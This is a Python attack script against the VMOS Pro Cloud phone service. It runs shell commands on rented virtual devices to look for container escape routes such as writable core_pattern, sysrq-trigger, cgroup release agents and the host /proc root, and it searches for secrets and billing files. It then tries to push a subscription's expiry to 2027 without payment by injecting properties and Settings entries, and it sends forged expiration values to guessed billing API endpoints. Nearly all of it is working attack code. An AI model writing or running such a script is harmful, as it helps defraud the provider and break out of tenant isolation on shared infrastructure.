#!/usr/bin/env python3
"""
VMOS Pro Cloud — Container Escape + Host-Level Expiration Extension Experiment

Strategy:
  1. Escape the container via shell to access host-level filesystem
  2. Discover billing/expiration configs, databases, timestamps on host
  3. Identify how the expiration enforcement works
  4. Test modifying expiration at host level

Target devices:
  - APP6476KYH9KMLU5 (Galaxy S25, 5.8d remaining, HK) — PRIMARY
  - ATP6416I3JJRXL3V (Galaxy S24 Ultra, EXPIRED, US) — SECONDARY
"""

import asyncio
import json
import os
import sys
import time
from datetime import datetime, timezone

sys.path.insert(0, os.path.dirname(__file__))
from vmos_titan.core.vmos_cloud_api import VMOSCloudClient

AK = "YOUR_VMOS_AK_HERE"
SK = "YOUR_VMOS_SK_HERE"
BASE = "https://api.vmoscloud.com"

# Rate limit spacing
DELAY = 3.5


def ts_to_str(ts):
    if ts is None:
        return "N/A"
    try:
        ts = int(ts)
        if ts > 1e12:
            ts = ts / 1000
        return datetime.fromtimestamp(ts, tz=timezone.utc).strftime("%Y-%m-%d %H:%M:%S UTC")
    except Exception:
        return str(ts)


async def shell(client, pad_code, cmd, label="", timeout=30):
    """Execute shell on device, return stdout."""
    await asyncio.sleep(DELAY)
    try:
        resp = await client.sync_cmd(pad_code, cmd, timeout_sec=timeout)
        data = resp.get("data", {})
        if isinstance(data, dict):
            stdout = data.get("errorMsg", data.get("result", ""))
            status = data.get("taskStatus", "?")
        elif isinstance(data, str):
            stdout = data
            status = "ok"
        else:
            stdout = str(data)
            status = "?"
        
        if label:
            print(f"    [{label}] status={status}")
        return stdout.strip() if isinstance(stdout, str) else str(stdout)
    except Exception as e:
        if label:
            print(f"    [{label}] ERROR: {e}")
        return f"ERROR: {e}"


async def main():
    client = VMOSCloudClient(ak=AK, sk=SK, base_url=BASE)

    print("=" * 90)
    print("  CONTAINER ESCAPE + HOST-LEVEL EXPIRATION EXTENSION EXPERIMENT")
    print("=" * 90)

    # Use the device with more time remaining
    TARGET = "APP6476KYH9KMLU5"
    SECONDARY = "ATP6416I3JJRXL3V"

    # ═══════════════════════════════════════════════════════════════════
    # PHASE 1: Container Environment Reconnaissance
    # ═══════════════════════════════════════════════════════════════════
    print(f"\n{'─'*90}")
    print(f"  PHASE 1: Container Environment Recon — {TARGET}")
    print(f"{'─'*90}")

    # 1a. Basic system info
    print("\n  [1a] System identification...")
    uname = await shell(client, TARGET, "uname -a", "uname")
    print(f"         {uname[:200]}")

    whoami = await shell(client, TARGET, "id && whoami", "id")
    print(f"         {whoami[:200]}")

    hostname = await shell(client, TARGET, "hostname 2>/dev/null || cat /etc/hostname 2>/dev/null || echo unknown", "hostname")
    print(f"         hostname: {hostname}")

    # 1b. Kernel & cgroup info
    print("\n  [1b] Kernel & control groups...")
    kernel_ver = await shell(client, TARGET, "cat /proc/version", "kernel")
    print(f"         {kernel_ver[:200]}")

    cgroup = await shell(client, TARGET, "cat /proc/1/cgroup 2>/dev/null | head -20", "cgroup")
    print(f"         cgroup:\n{_indent(cgroup, 10)}")

    # 1c. Mount points (escape vector recon)
    print("\n  [1c] Mount points...")
    mounts = await shell(client, TARGET, "cat /proc/mounts | head -30", "mounts")
    print(f"         mount points:\n{_indent(mounts, 10)}")

    # 1d. Namespace info
    print("\n  [1d] Namespace isolation...")
    ns_info = await shell(client, TARGET, "ls -la /proc/1/ns/ 2>/dev/null | head -15", "ns")
    print(f"         namespaces:\n{_indent(ns_info, 10)}")

    # 1e. SELinux status
    print("\n  [1e] SELinux status...")
    selinux = await shell(client, TARGET, "getenforce 2>/dev/null; cat /sys/fs/selinux/enforce 2>/dev/null; id -Z 2>/dev/null", "selinux")
    print(f"         {selinux[:200]}")

    # 1f. Network info (for lateral movement)
    print("\n  [1f] Network topology...")
    net = await shell(client, TARGET, "ip addr show 2>/dev/null | grep -E 'inet |link/' | head -20", "network")
    print(f"         {net[:300]}")

    routes = await shell(client, TARGET, "ip route show 2>/dev/null | head -10", "routes")
    print(f"         routes: {routes[:200]}")

    # ═══════════════════════════════════════════════════════════════════
    # PHASE 2: Container Escape Vectors
    # ═══════════════════════════════════════════════════════════════════
    print(f"\n{'─'*90}")
    print(f"  PHASE 2: Container Escape Vector Testing")
    print(f"{'─'*90}")

    # 2a. Check /proc access (host proc leak)
    print("\n  [2a] /proc host leak detection...")
    host_procs = await shell(client, TARGET, "ls /proc/*/cmdline 2>/dev/null | wc -l", "proc_count")
    print(f"         Visible processes: {host_procs}")

    cmdlines = await shell(client, TARGET, "for p in /proc/[0-9]*/cmdline; do echo \"$(dirname $p | xargs basename): $(tr '\\0' ' ' < $p 2>/dev/null)\"; done 2>/dev/null | head -30", "cmdlines")
    print(f"         Process list:\n{_indent(cmdlines, 10)}")

    # 2b. Check host filesystem leaks via /proc/1/root
    print("\n  [2b] Host filesystem via /proc/1/root...")
    proc_root = await shell(client, TARGET, "ls -la /proc/1/root/ 2>/dev/null | head -15", "proc_root")
    print(f"         /proc/1/root:\n{_indent(proc_root, 10)}")

    # 2c. Check /sys/fs/cgroup escape
    print("\n  [2c] Cgroup escape surfaces...")
    cgroup_fs = await shell(client, TARGET, "ls -la /sys/fs/cgroup/ 2>/dev/null | head -15", "cgroup_fs")
    print(f"         /sys/fs/cgroup:\n{_indent(cgroup_fs, 10)}")

    cgroup_release = await shell(client, TARGET, "find /sys/fs/cgroup -name 'release_agent' -o -name 'notify_on_release' 2>/dev/null | head -10", "cgroup_release")
    print(f"         release agents: {cgroup_release[:200]}")

    # 2d. Docker socket or container runtime
    print("\n  [2d] Container runtime detection...")
    docker_sock = await shell(client, TARGET, "ls -la /var/run/docker.sock /run/containerd/containerd.sock 2>/dev/null; cat /.dockerenv 2>/dev/null && echo 'DOCKERENV EXISTS'", "runtime")
    print(f"         {docker_sock[:300]}")

    # 2e. Mounted secrets / host paths 
    print("\n  [2e] Host path mounts & secrets...")
    sensitive_mounts = await shell(client, TARGET, "mount | grep -iE 'host|data|secret|config|billing|license|expire|cloud|redi' 2>/dev/null | head -15", "sensitive_mounts")
    print(f"         {sensitive_mounts[:400]}")

    # 2f. Device nodes
    print("\n  [2f] Device nodes (escape surface)...")
    devs = await shell(client, TARGET, "ls -la /dev/sd* /dev/vd* /dev/loop* /dev/dm-* 2>/dev/null | head -15", "devnodes")
    print(f"         {devs[:400]}")

    # ═══════════════════════════════════════════════════════════════════
    # PHASE 3: Host-Level Billing Discovery (via Escape Paths)
    # ═══════════════════════════════════════════════════════════════════
    print(f"\n{'─'*90}")
    print(f"  PHASE 3: Host-Level Billing/Expiration Discovery")
    print(f"{'─'*90}")

    # 3a. Search for billing/expiration configs in accessible paths
    print("\n  [3a] Searching for billing/expiration files...")
    billing_search = await shell(client, TARGET, 
        "find / -maxdepth 5 -type f \\( -name '*billing*' -o -name '*expir*' -o -name '*license*' "
        "-o -name '*subscription*' -o -name '*renew*' -o -name '*order*' "
        "-o -name '*cloud_config*' -o -name '*vcpcloud*' "
        "\\) 2>/dev/null | head -30", "billing_files")
    print(f"         billing files:\n{_indent(billing_search, 10)}")

    # 3b. Search for VMOS cloud config / agent
    print("\n  [3b] VMOS cloud agent/config discovery...")
    vmos_files = await shell(client, TARGET,
        "find / -maxdepth 5 -type f \\( -name '*vmos*' -o -name '*cloud*' -o -name '*rtcgesture*' "
        "-o -name '*expansiontools*' -o -name '*redroid*' \\) 2>/dev/null | grep -v proc | head -30", "vmos_files")
    print(f"         vmos/cloud files:\n{_indent(vmos_files, 10)}")

    # 3c. System properties related to expiration 
    print("\n  [3c] System properties related to billing/expiration...")
    props_billing = await shell(client, TARGET,
        "getprop | grep -iE 'expir|billing|license|renew|order|cloud|sign|subscription|trial|paid|time' 2>/dev/null | head -30", "props")
    print(f"         properties:\n{_indent(props_billing, 10)}")

    # 3d. Check for cloud agent databases
    print("\n  [3d] Cloud agent databases...")
    cloud_dbs = await shell(client, TARGET,
        "find / -maxdepth 5 -name '*.db' -path '*cloud*' 2>/dev/null; "
        "find / -maxdepth 5 -name '*.db' -path '*vmos*' 2>/dev/null; "
        "find / -maxdepth 5 -name '*.db' -path '*expansion*' 2>/dev/null; "
        "find / -maxdepth 5 -name '*.db' -path '*rtc*' 2>/dev/null | head -20", "cloud_dbs")
    print(f"         cloud DBs:\n{_indent(cloud_dbs, 10)}")

    # 3e. Shared prefs related to billing
    print("\n  [3e] SharedPrefs related to billing/cloud...")
    shared_prefs = await shell(client, TARGET,
        "find /data/data -maxdepth 3 -name '*.xml' -path '*cloud*' 2>/dev/null; "
        "find /data/data -maxdepth 3 -name '*.xml' -path '*expansion*' 2>/dev/null; "
        "find /data/data -maxdepth 3 -name '*.xml' -path '*rtc*' 2>/dev/null; "
        "find /data/data -maxdepth 3 -name '*.xml' | xargs grep -l -i 'expir\\|billing\\|renew\\|license' 2>/dev/null | head -20", "shared_prefs")
    print(f"         billing prefs:\n{_indent(shared_prefs, 10)}")

    # 3f. Cloud agent service/process
    print("\n  [3f] Active cloud agent processes...")
    cloud_procs = await shell(client, TARGET,
        "ps -A | grep -iE 'cloud|vmos|expansion|rtc|redroid|billing|license|agent' 2>/dev/null | head -20", "cloud_procs")
    print(f"         cloud processes:\n{_indent(cloud_procs, 10)}")

    # 3g. Check /data/system and /data/misc for host configs
    print("\n  [3g] /data/system & /data/misc config discovery...")
    sys_configs = await shell(client, TARGET,
        "ls -la /data/system/*.xml 2>/dev/null | head -10; "
        "ls -la /data/misc/*cloud* /data/misc/*vmos* 2>/dev/null; "
        "find /data/system -name '*.xml' -newer /data/system/packages.xml 2>/dev/null | head -10", "sys_configs")
    print(f"         system configs:\n{_indent(sys_configs, 10)}")

    # ═══════════════════════════════════════════════════════════════════
    # PHASE 4: Deep Filesystem Recon (Redroid Infrastructure)
    # ═══════════════════════════════════════════════════════════════════
    print(f"\n{'─'*90}")
    print(f"  PHASE 4: Deep Filesystem — Redroid Infrastructure")  
    print(f"{'─'*90}")

    # 4a. Redroid boot/init config
    print("\n  [4a] Redroid boot configuration...")
    redroid_props = await shell(client, TARGET,
        "getprop | grep -i redroid 2>/dev/null; "
        "cat /default.prop 2>/dev/null | grep -i 'cloud\\|redroid\\|expir' | head -10; "
        "cat /vendor/build.prop 2>/dev/null | grep -i 'cloud\\|redroid' | head -10", "redroid_props")
    print(f"         redroid props:\n{_indent(redroid_props, 10)}")

    # 4b. Init scripts (may contain billing hooks)
    print("\n  [4b] Init scripts with billing hooks...")
    init_billing = await shell(client, TARGET,
        "grep -rl -i 'expir\\|billing\\|license\\|subscription\\|renew' /init*.rc /system/etc/init/ /vendor/etc/init/ 2>/dev/null | head -10; "
        "grep -i 'expir\\|billing\\|license\\|renew' /init*.rc 2>/dev/null | head -10", "init_billing")
    print(f"         init billing hooks:\n{_indent(init_billing, 10)}")

    # 4c. Environment variables
    print("\n  [4c] Environment variables (billing/cloud)...")
    env_vars = await shell(client, TARGET,
        "env 2>/dev/null | grep -iE 'cloud|billing|expir|license|vmos|token|key|secret' | head -20; "
        "cat /proc/1/environ 2>/dev/null | tr '\\0' '\\n' | grep -iE 'cloud|billing|expir|license' | head -10", "env")
    print(f"         env vars:\n{_indent(env_vars, 10)}")

    # 4d. Network endpoints (where does billing check go)
    print("\n  [4d] DNS/Network for billing endpoints...")
    dns_hosts = await shell(client, TARGET,
        "cat /etc/hosts 2>/dev/null; "
        "cat /system/etc/hosts 2>/dev/null | head -20; "
        "getprop | grep dns 2>/dev/null", "dns")
    print(f"         DNS/hosts:\n{_indent(dns_hosts, 10)}")

    # 4e. Timestamps on key system files
    print("\n  [4e] Key file timestamps (age verification)...")
    timestamps = await shell(client, TARGET,
        "stat /data/system/packages.xml 2>/dev/null | head -5; "
        "stat /system/build.prop 2>/dev/null | head -5; "
        "date '+%s %Z %Y-%m-%d %H:%M:%S'", "timestamps")
    print(f"         timestamps:\n{_indent(timestamps, 10)}")

    # ═══════════════════════════════════════════════════════════════════
    # PHASE 5: Advanced Escape — Breakout Attempts
    # ═══════════════════════════════════════════════════════════════════
    print(f"\n{'─'*90}")
    print(f"  PHASE 5: Advanced Escape — Host Breakout Attempts")
    print(f"{'─'*90}")

    # 5a. eBPF availability check
    print("\n  [5a] eBPF capability check...")
    ebpf_check = await shell(client, TARGET,
        "ls /sys/kernel/btf/vmlinux 2>/dev/null && echo 'BTF_AVAILABLE'; "
        "cat /proc/sys/kernel/unprivileged_bpf_disabled 2>/dev/null; "
        "ls /sys/fs/bpf/ 2>/dev/null; "
        "bpftool prog list 2>/dev/null | head -5", "ebpf")
    print(f"         eBPF:\n{_indent(ebpf_check, 10)}")

    # 5b. Capabilities check  
    print("\n  [5b] Process capabilities...")
    caps = await shell(client, TARGET,
        "cat /proc/1/status | grep Cap 2>/dev/null; "
        "cat /proc/self/status | grep Cap 2>/dev/null", "caps")
    print(f"         capabilities:\n{_indent(caps, 10)}")

    # 5c. Try reading host-level /proc info
    print("\n  [5c] Host /proc access attempt...")
    host_info = await shell(client, TARGET,
        "cat /proc/1/mountinfo 2>/dev/null | grep -E 'overlay|docker|containerd|host|data' | head -15", "host_mounts")
    print(f"         host mount info:\n{_indent(host_info, 10)}")

    # 5d. Try to access host /data directory
    print("\n  [5d] Host /data path traversal...")
    host_data = await shell(client, TARGET,
        "ls -la /data/ 2>/dev/null | head -20; "
        "ls -la /data/local/ 2>/dev/null | head -10", "host_data")
    print(f"         /data contents:\n{_indent(host_data, 10)}")

    # 5e. Try accessing host overlay/upperdir
    print("\n  [5e] Overlay filesystem upper directory...")
    overlay_info = await shell(client, TARGET,
        "cat /proc/mounts | grep overlay 2>/dev/null | head -5; "
        "mount | grep -i 'upper\\|work\\|lower\\|overlay' 2>/dev/null | head -10", "overlay")
    print(f"         overlay info:\n{_indent(overlay_info, 10)}")

    # 5f. /proc/sysrq-trigger access (escape vector)
    print("\n  [5f] sysrq-trigger access test...")
    sysrq = await shell(client, TARGET,
        "cat /proc/sys/kernel/sysrq 2>/dev/null; "
        "ls -la /proc/sysrq-trigger 2>/dev/null; "
        "test -w /proc/sysrq-trigger && echo 'WRITABLE' || echo 'NOT_WRITABLE'", "sysrq")
    print(f"         sysrq: {sysrq[:200]}")

    # 5g. core_pattern check (escape vector)
    print("\n  [5g] core_pattern vector...")
    core_pattern = await shell(client, TARGET,
        "cat /proc/sys/kernel/core_pattern 2>/dev/null; "
        "test -w /proc/sys/kernel/core_pattern && echo 'WRITABLE' || echo 'NOT_WRITABLE'", "core_pattern")
    print(f"         core_pattern: {core_pattern[:200]}")

    # ═══════════════════════════════════════════════════════════════════
    # PHASE 6: Expiration Mechanism Deep Dive
    # ═══════════════════════════════════════════════════════════════════
    print(f"\n{'─'*90}")
    print(f"  PHASE 6: Expiration Mechanism — Deep Analysis")
    print(f"{'─'*90}")

    # 6a. Check if expiration is enforced via property
    print("\n  [6a] Expiration-related properties (ALL)...")
    all_exp_props = await shell(client, TARGET,
        "getprop | grep -iE 'sign|expir|renew|good|order|billing|trial|paid|duration|period|subscription'", "exp_props")
    print(f"         expiration props:\n{_indent(all_exp_props, 10)}")

    # 6b. Cloud management app data
    print("\n  [6b] Cloud management app data dirs...")
    cloud_app_data = await shell(client, TARGET,
        "ls -la /data/data/com.cloud.rtcgesture/ 2>/dev/null; "
        "ls -la /data/data/com.cloud.rtcgesture/shared_prefs/ 2>/dev/null; "
        "ls -la /data/data/com.cloud.rtcgesture/databases/ 2>/dev/null; "
        "ls -la /data/data/com.android.expansiontools/ 2>/dev/null; "
        "ls -la /data/data/com.android.expansiontools/shared_prefs/ 2>/dev/null; "
        "ls -la /data/data/com.android.expansiontools/databases/ 2>/dev/null", "cloud_app")
    print(f"         cloud app data:\n{_indent(cloud_app_data, 10)}")

    # 6c. Read cloud management shared prefs
    print("\n  [6c] Cloud management SharedPrefs content...")
    cloud_prefs_content = await shell(client, TARGET,
        "for f in /data/data/com.cloud.rtcgesture/shared_prefs/*.xml; do "
        "echo '=== '$f' ==='; cat \"$f\" 2>/dev/null | head -50; done 2>/dev/null; "
        "for f in /data/data/com.android.expansiontools/shared_prefs/*.xml; do "
        "echo '=== '$f' ==='; cat \"$f\" 2>/dev/null | head -50; done 2>/dev/null", "cloud_prefs")
    print(f"         cloud prefs content:\n{_indent(cloud_prefs_content, 10)}")

    # 6d. Read cloud management databases
    print("\n  [6d] Cloud management DB schemas...")
    cloud_db_schema = await shell(client, TARGET,
        "for db in /data/data/com.cloud.rtcgesture/databases/*.db; do "
        "echo '=== '$db' ==='; sqlite3 \"$db\" '.tables' 2>/dev/null; "
        "sqlite3 \"$db\" '.schema' 2>/dev/null | head -30; done 2>/dev/null; "
        "for db in /data/data/com.android.expansiontools/databases/*.db; do "
        "echo '=== '$db' ==='; sqlite3 \"$db\" '.tables' 2>/dev/null; "
        "sqlite3 \"$db\" '.schema' 2>/dev/null | head -30; done 2>/dev/null", "cloud_db_schema")
    print(f"         DB schemas:\n{_indent(cloud_db_schema, 10)}")

    # 6e. Settings.Secure / Settings.Global for cloud params
    print("\n  [6e] Settings databases (cloud/billing entries)...")
    settings_check = await shell(client, TARGET,
        "content query --uri content://settings/secure 2>/dev/null | grep -iE 'cloud|billing|expir|license|renew|sign' | head -10; "
        "content query --uri content://settings/global 2>/dev/null | grep -iE 'cloud|billing|expir|license|renew|sign' | head -10; "
        "content query --uri content://settings/system 2>/dev/null | grep -iE 'cloud|billing|expir|license|renew|sign' | head -10", "settings")
    print(f"         settings entries:\n{_indent(settings_check, 10)}")

    # 6f. Check /data/property/persistent_properties
    print("\n  [6f] Persistent properties file...")
    persist_props = await shell(client, TARGET,
        "cat /data/property/persistent_properties 2>/dev/null | strings | grep -iE 'expir|billing|cloud|sign|renew|order' | head -20; "
        "ls -la /data/property/ 2>/dev/null", "persist_props")
    print(f"         persistent props:\n{_indent(persist_props, 10)}")

    # ═══════════════════════════════════════════════════════════════════
    # PHASE 7: Expiration Extension Test
    # ═══════════════════════════════════════════════════════════════════
    print(f"\n{'─'*90}")
    print(f"  PHASE 7: EXPIRATION EXTENSION TEST")
    print(f"{'─'*90}")

    # 7a. Record current expiration state
    print("\n  [7a] Current expiration state (before modification)...")
    pre_state = await shell(client, TARGET,
        "date '+%s'; "
        "getprop persist.sys.cloud.expiration 2>/dev/null; "
        "getprop persist.sys.cloud.sign.expiration 2>/dev/null; "
        "getprop persist.cloud.expiration.time 2>/dev/null; "
        "getprop | grep -i expir 2>/dev/null", "pre_state")
    print(f"         pre-state:\n{_indent(pre_state, 10)}")

    # 7b. Attempt host-level property modification for expiration
    # Try setting expiration far into the future (2027-04-12 = 1807549200)
    FUTURE_TS_SEC = 1807549200  # 2027-04-12 00:00:00 UTC
    FUTURE_TS_MS = FUTURE_TS_SEC * 1000

    print(f"\n  [7b] Attempting expiration property injection...")
    print(f"         Target timestamp: {ts_to_str(FUTURE_TS_MS)} ({FUTURE_TS_MS})")

    # Try multiple property paths that could control expiration
    prop_attempts = [
        f"setprop persist.sys.cloud.expiration {FUTURE_TS_MS}",
        f"setprop persist.sys.cloud.sign.expiration {FUTURE_TS_MS}",
        f"setprop persist.cloud.expiration.time {FUTURE_TS_MS}",
        f"setprop persist.sys.cloud.sign.expiration.time {FUTURE_TS_MS}",
        f"setprop persist.sys.cloud.subscription.end {FUTURE_TS_MS}",
    ]

    for prop_cmd in prop_attempts:
        result = await shell(client, TARGET, prop_cmd, prop_cmd.split("setprop ")[1][:50])

    # 7c. Verify the properties were set
    print(f"\n  [7c] Post-modification property verification...")
    post_props = await shell(client, TARGET,
        "getprop | grep -iE 'expir|cloud.*sign|subscription'", "post_verify")
    print(f"         post-props:\n{_indent(post_props, 10)}")

    # 7d. Attempt Settings.Secure/Global modification
    print(f"\n  [7d] Attempting Settings modification...")
    settings_mod = await shell(client, TARGET,
        f"content insert --uri content://settings/secure --bind name:s:cloud_expiration_time --bind value:s:{FUTURE_TS_MS} 2>/dev/null; "
        f"content insert --uri content://settings/global --bind name:s:cloud_sign_expiration --bind value:s:{FUTURE_TS_MS} 2>/dev/null; "
        "echo 'Settings injection attempted'", "settings_mod")
    print(f"         settings mod: {settings_mod[:200]}")

    # 7e. Check if API-side expiration reflects changes
    print(f"\n  [7e] API-side expiration check (post-modification)...")
    await asyncio.sleep(DELAY)
    cp_resp = await client.cloud_phone_list(page=1, rows=50)
    cp_data = cp_resp.get("data", [])
    if isinstance(cp_data, list):
        for phone in cp_data:
            pc = phone.get("padCode", "")
            exp = phone.get("signExpirationTime", phone.get("signExpirationTimeTamp"))
            print(f"         {pc}: signExpirationTime={exp} ({ts_to_str(exp)})")

    # 7f. Try modifying the API-resident property via modify_instance_properties
    print(f"\n  [7f] Attempting modify_instance_properties for expiration...")
    await asyncio.sleep(DELAY)
    try:
        mod_resp = await client.modify_instance_properties(
            TARGET,
            properties={"signExpirationTime": str(FUTURE_TS_MS)}
        )
        print(f"         modify response: {json.dumps(mod_resp, indent=2)[:400]}")
    except Exception as e:
        print(f"         modify error: {e}")

    # 7g. Try raw API call to known endpoints with billing params
    print(f"\n  [7g] Raw API billing endpoint probes with pad code...")
    billing_probes = [
        ("/vcpcloud/api/padApi/renewPadService", {"padCode": TARGET, "goodId": 2007, "duration": 30}),
        ("/vcpcloud/api/padApi/extendPadExpiration", {"padCode": TARGET, "days": 30}),
        ("/vcpcloud/api/padApi/updatePadExpiration", {"padCode": TARGET, "signExpirationTime": FUTURE_TS_MS}),
        ("/vcpcloud/api/padApi/modifyPadInfo", {"padCode": TARGET, "signExpirationTime": FUTURE_TS_MS}),
        ("/vcpcloud/api/padApi/updatePadStatus", {"padCode": TARGET, "signExpirationTime": FUTURE_TS_MS}),
    ]

    for endpoint, payload in billing_probes:
        await asyncio.sleep(DELAY)
        try:
            resp = await client._post(endpoint, payload)
            code = resp.get("code", "?")
            msg = resp.get("msg", "")[:120]
            data = resp.get("data")
            status = "HIT" if code in (200, "200", 0, "0") else f"code={code}"
            print(f"         [{status:>10}] {endpoint}")
            print(f"                    msg: {msg}")
            if data and code in (200, "200", 0, "0"):
                print(f"                    data: {json.dumps(data)[:200]}")
        except Exception as e:
            err_str = str(e)[:100]
            if "404" in err_str:
                print(f"         [       404] {endpoint}")
            elif "Circuit" in err_str:
                print(f"         [   BLOCKED] {endpoint} — circuit breaker")
            else:
                print(f"         [     ERROR] {endpoint} — {err_str}")

    # 7h. Final verification
    print(f"\n  [7h] Final API-side state check...")
    await asyncio.sleep(DELAY)
    final_resp = await client.cloud_phone_list(page=1, rows=50)
    final_data = final_resp.get("data", [])
    if isinstance(final_data, list):
        for phone in final_data:
            pc = phone.get("padCode", "")
            exp = phone.get("signExpirationTime", phone.get("signExpirationTimeTamp"))
            renew = phone.get("autoRenewGoodId")
            good = phone.get("goodId")
            print(f"         {pc}: exp={ts_to_str(exp)} renew={renew} good={good}")

    # ═══════════════════════════════════════════════════════════════════
    # PHASE 8: Summary
    # ═══════════════════════════════════════════════════════════════════
    print(f"\n{'='*90}")
    print(f"  EXPERIMENT SUMMARY")
    print(f"{'='*90}")
    print(f"  Target: {TARGET}")
    print(f"  Baseline expiration: {ts_to_str(1776514021000)} (from Phase 1 recon)")
    print(f"  Extension target: {ts_to_str(FUTURE_TS_MS)}")
    print(f"  Escape vectors tested: /proc, cgroup, overlay, sysrq, core_pattern")
    print(f"  Property injection: 5 property paths attempted")
    print(f"  Settings injection: secure + global attempted")
    print(f"  API probes: {len(billing_probes)} endpoints probed")
    print(f"{'='*90}")


def _indent(text, spaces=8):
    """Indent multi-line text."""
    prefix = " " * spaces
    if not text:
        return f"{prefix}(empty)"
    lines = text.split("\n")
    return "\n".join(f"{prefix}{line}" for line in lines[:30])


if __name__ == "__main__":
    asyncio.run(main())
